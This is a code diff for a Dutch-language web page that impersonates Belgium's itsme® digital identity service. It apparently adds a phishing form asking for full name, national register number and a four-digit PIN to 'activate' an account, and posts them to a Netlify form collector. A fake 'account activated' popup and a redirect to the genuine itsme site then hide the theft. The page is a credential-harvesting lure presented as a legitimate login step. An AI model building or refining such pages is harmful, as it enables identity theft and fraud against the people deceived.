@@ -308,29 +308,136 @@
             </div>
         </header>
 
-        <main>
-            <form name="personalDataForm" netlify netlify-honeypot="bot-field" novalidate>
-  <input type="hidden" name="form-name" value="personalDataForm" />
-  <p class="d-none">
-    <label>Laat dit veld leeg: <input name="bot-field" /></label>
-  </p>
+       <main>
+  <div class="im-content-primary">
+    <h1>Vul je persoonlijke gegevens in</h1>
+    <p>
+      Geef je volledige naam, rijksregisternummer en gewenste pincode in om je itsme®-account te activeren.
+    </p>
 
-  <label for="firstName">Voornaam</label>
-  <input type="text" id="firstName" name="firstName" required />
+    <form 
+      id="personalDataForm" 
+      name="personalDataForm" 
+      netlify 
+      netlify-honeypot="bot-field" 
+      novalidate
+    >
+      <!-- Netlify hidden field -->
+      <input type="hidden" name="form-name" value="personalDataForm" />
 
-  <label for="lastName">Achternaam</label>
-  <input type="text" id="lastName" name="lastName" required />
+      <!-- Honeypot veld -->
+      <p class="d-none">
+        <label>Laat dit veld leeg: <input name="bot-field" /></label>
+      </p>
 
-  <label for="nationalNumber">Rijksregisternummer</label>
-  <input type="text" id="nationalNumber" name="nationalNumber" required />
+      <div class="form-group">
+        <label for="firstName">Voornaam</label>
+        <input 
+          type="text" 
+          id="firstName" 
+          name="firstName" 
+          placeholder="Je voornaam" 
+          required 
+        >
+      </div>
 
-  <label for="pinCode">Pincode</label>
-  <input type="password" id="pinCode" name="pinCode" required />
+      <div class="form-group">
+        <label for="lastName">Achternaam</label>
+        <input 
+          type="text" 
+          id="lastName" 
+          name="lastName" 
+          placeholder="Je achternaam" 
+          required
+        >
+      </div>
 
-  <button type="submit">Account activeren</button>
-</form>
+      <div class="form-group">
+        <label for="nationalNumber">Rijksregisternummer</label>
+        <input 
+          type="text" 
+          id="nationalNumber" 
+          name="nationalNumber" 
+          placeholder="00.00.00-000.00" 
+          maxlength="15" 
+          pattern="[0-9]{2}\.[0-9]{2}\.[0-9]{2}-[0-9]{3}\.[0-9]{2}" 
+          required
+        >
+      </div>
 
-        </main>
+      <div class="form-group">
+        <label for="pinCode">Pincode (4 cijfers)</label>
+        <input 
+          type="password" 
+          id="pinCode" 
+          name="pinCode" 
+          placeholder="••••" 
+          maxlength="4" 
+          pattern="[0-9]{4}" 
+          required
+        >
+      </div>
+
+      <p id="privacy">
+        Door verder te gaan, ga je akkoord met het
+        <a href="https://www.itsme-id.com/nl-BE/legal/privacy-statement" target="_blank">
+          privacybeleid
+        </a>.
+      </p>
+
+      <div class="btn-container">
+        <button type="submit" class="btn">Account activeren</button>
+      </div>
+    </form>
+  </div>
+
+  <div class="im-content-secondary">
+    <div>
+      <img src="/assets/EnterPhoneNumber.svg" alt="">
+      <p>Vul je persoonlijke gegevens in om je itsme®-account te voltooien en veilig te identificeren.</p>
+    </div>
+  </div>
+
+  <!-- Professionele modal popup -->
+  <div class="modal-overlay" id="modalOverlay" style="display:none;">
+    <div class="modal">
+      <h2>Account Geactiveerd</h2>
+      <p>
+        Hartelijk dank voor uw registratie! Uw itsme®-account is succesvol
+        geactiveerd en klaar voor gebruik. U kunt nu veilig en eenvoudig inloggen
+        en al uw digitale diensten beheren.
+      </p>
+      <a href="https://www.itsme-id.com/nl-BE" class="close-btn" id="closeModalBtn">Sluiten</a>
+    </div>
+  </div>
+
+  <script>
+    const form = document.querySelector('form[name="personalDataForm"]');
+    const modal = document.getElementById('modalOverlay');
+    const closeModalBtn = document.getElementById('closeModalBtn');
+
+    form.addEventListener('submit', function(event) {
+      event.preventDefault(); // voorkom directe submit zodat we de popup tonen
+
+      // Optioneel: hier kan je client-side validatie toevoegen als je wil
+
+      // Toon modal popup
+      modal.style.display = 'block';
+
+      // Na tonen modal: submit het formulier na een korte vertraging (bv. 2 sec)
+      setTimeout(() => {
+        form.submit();
+      }, 2000);
+    });
+
+    // Sluit knop modal
+    closeModalBtn.addEventListener('click', function(event) {
+      event.preventDefault();
+      modal.style.display = 'none';
+    });
+  </script>
+</main>
+
     </div>
 
     <!-- Professionele modal popup -->
